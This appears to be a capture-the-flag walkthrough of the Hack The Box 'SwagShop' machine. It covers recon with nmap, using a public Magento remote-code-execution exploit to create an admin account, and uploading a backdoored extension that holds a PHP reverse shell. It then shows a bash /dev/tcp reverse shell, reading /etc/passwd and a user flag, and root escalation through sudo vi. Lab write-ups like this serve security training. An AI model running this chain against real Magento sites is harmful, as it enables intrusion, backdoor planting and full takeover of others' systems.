@@ -1,0 +1,185 @@
+STEP-1 KNOW YOUR IP
+
+root@kali:~/Desktop/HackTheBox# ifconfig
+tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST> mtu 1500
+ inet 10.10.13.89 netmask 255.255.252.0 destination 10.10.13.89
+ inet6 dead:beef:2::1157 prefixlen 64 scopeid 0x0<global>
+ inet6 fe80::f1fc:e624:bc32:971b prefixlen 64 scopeid 0x20<link>
+ unspec 00–00–00–00–00–00–00–00–00–00–00–00–00–00–00–00 txqueuelen 100 (UNSPEC)
+ RX packets 0 bytes 0 (0.0 B)
+ RX errors 0 dropped 0 overruns 0 frame 0
+ TX packets 1 bytes 48 (48.0 B)
+ TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
+ So, My IP Address = 10.10.13.89
+ My Target = 10.10.10.140
+
+STEP-2 : NMAP SCAN
+root@kali:~/Desktop/HackTheBox# nmap -sV -sC -oA namp 10.10.10.140
+# Nmap 7.70 scan initiated Mon May 27 15:04:18 2019 as: nmap -sC -sV -oA nmap 10.10.10.140
+Nmap scan report for 10.10.10.140
+Host is up (0.40s latency).
+Not shown: 998 closed ports
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+| 2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
+| 256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
+|_ 256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
+80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Home page
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon May 27 15:05:19 2019–1 IP address (1 host up) scanned in 61.12 seconds
+
+
+STEP-3: SEARCHSPLOIT
+For OSCP Preparation: Use Searchsploit to search exploit-db.com and modify it to your case. Leave the metasploit alone.
+
+root@kali:~/Desktop/HackTheBox# searchsploit -m exploits/xml/webapps/37977.py
+ — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+ Exploit Title | Path (/opt/searchsploit/)
+ — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+Magento eCommerce — Remote Code Execution | exploits/xml/webapps/37977.py
+ — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+Found the RCE !!
+Modify The File 37977.py
+target = “http://10.10.10.140/"
+target_url = target + “/index.php” + “/admin/Cms_Wysiwyg/directive/index/”
+
+STEP-4 : GAINING NORMAL USER
+root@kali:~/Desktop# python 37977.py
+WORKED
+Check http://10.10.10.140/admin with creds forme:forme
+Now visit http://10.10.10.140/index.php/admin/
+ LOG IN using forme : forme
+Download The LavaMagentoBD from https://github.com/lavalamp-/LavaMagentoBD
+And, MODIFY some files in lavamagento_bd.tar(Open with Archive and Update as Mentionioed Below)
+ — BACKDOOR>app>code>community>Lavalamp>Connector>controllers>IndexController.php and replace the code with your reverse shell code
+ — Reverse Shell Code : http://pentestmonkey.net/tools/web-shells/php-reverse-shell
+ $ip = ‘127.0.0.1’; // CHANGE THIS TO Your IP in my case 10.10.13.89
+ $port = 1234;
+ — package.xml change the hash with your hash (md5sum IndexController.php ) of IndexController.php 2bdf99cee7b302afdc45d1d51ac7e373
+
+Next visit http://10.10.10.140/downloader/
+ — Upload the Package
+Start Listening on Port 1234 using netcat and activate your backdoor by visiting
+http://10.10.10.140/app/code/community/Lavalamp/Connector/controllers/IndexController.php
+
+root@kali:~/Desktop/HackTheBox# nc -v -n -l -p 1234
+listening on [any] 1234 …
+connect to [10.10.13.89] from (UNKNOWN) [10.10.10.140] 59246
+Linux swagshop 4.4.0–146-generic #172-Ubuntu SMP Wed Apr 3 09:00:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 02:36:47 up 2:13, 0 users, load average: 3.38, 1.51, 1.99
+USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can’t access tty; job control turned off
+$ export RHOST=10.10.13.89
+$ bash -c ‘bash -i &>/dev/tcp/$RHOST/14445 0<&1’
+OPEN A NEW TERMINAL TAB for
+
+root@kali:~/Desktop/HackTheBox# nc -lp 14445
+bash: cannot set terminal process group (1278): Inappropriate ioctl for device
+bash: no job control in this shell
+
+www-data@swagshop:/$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/bin/bash
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
+messagebus:x:108:112::/var/run/dbus:/bin/false
+uuidd:x:109:113::/run/uuidd:/bin/false
+dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
+haris:x:1000:1000:haris,,,:/home/haris:/bin/bash
+
+www-data@swagshop:/$ ls -alh /home/haris
+ls -alh /home/haris
+total 36K
+drwxr-xr-x 3 haris haris 4.0K May 8 09:21 .
+drwxr-xr-x 3 root root 4.0K May 2 14:48 ..
+-rw — — — — 1 haris haris 54 May 2 14:56 .Xauthority
+lrwxrwxrwx 1 root root 9 May 8 09:20 .bash_history -> /dev/null
+-rw-r — r — 1 haris haris 220 May 2 14:48 .bash_logout
+-rw-r — r — 1 haris haris 3.7K May 2 14:48 .bashrc
+drwx — — — 2 haris haris 4.0K May 2 14:49 .cache
+-rw — — — — 1 root root 1 May 8 09:20 .mysql_history
+-rw-r — r — 1 haris haris 655 May 2 14:48 .profile
+-rw-r — r — 1 haris haris 0 May 2 14:49 .sudo_as_admin_successful
+-rw-r — r — 1 haris haris 33 May 8 09:01 user.txt
+
+www-data@swagshop:/$ cat /home/haris/user.txt
+0x307836313334333433383338333733373332333733373635333833323636333033353635333536343634363633393636333933303631363536363632363136333338
+YAYYYYY!!!! Got Your USER FLAG
+
+STEP-5 : GOAL ROOT FLAG
+www-data@swagshop:/$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on swagshop:
+ env_reset, mail_badpass,
+ secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+User www-data may run the following commands on swagshop:
+ (root) NOPASSWD: /usr/bin/vi /var/www/html/*
+**IT SEEMS : We Can Use vi as root privelege without a password
+
+www-data@swagshop:/$ sudo /usr/bin/vi /var/www/html/test.sh
+sudo /usr/bin/vi /var/www/html/test.sh
+Vim: Warning: Output is not to a terminal
+Vim: Warning: Input is not from a terminal
+E558: Terminal entry not found in terminfo
+‘unknown’ not known. Available builtin terminals are:
+ builtin_amiga
+ builtin_beos-ansi
+ builtin_ansi
+ builtin_pcansi
+ builtin_win32
+ builtin_vt320
+ builtin_vt52
+ builtin_xterm
+ builtin_iris-ansi
+ builtin_debug
+ builtin_dumb
+defaulting to ‘ansi’
+:!cat /root/root.txt
+~
+~
+~
+~
+~
+~
+~
+~
+:!cat /root/root.txt
+0x307836333332363233303338333736343336333636353331333436313336333533323631333336323338333636313331333333303631363333353336333733323331
+___ ___
+ /| |/|\| |\
+/_| ´ |.` |_\ We are open! (Almost)
+ | |. |
+ | |. | Join the beta HTB Swag Store!
+ |___|.__| https://hackthebox.store/password
+PS: Use root flag as password!
+
+— — — THE END — — —
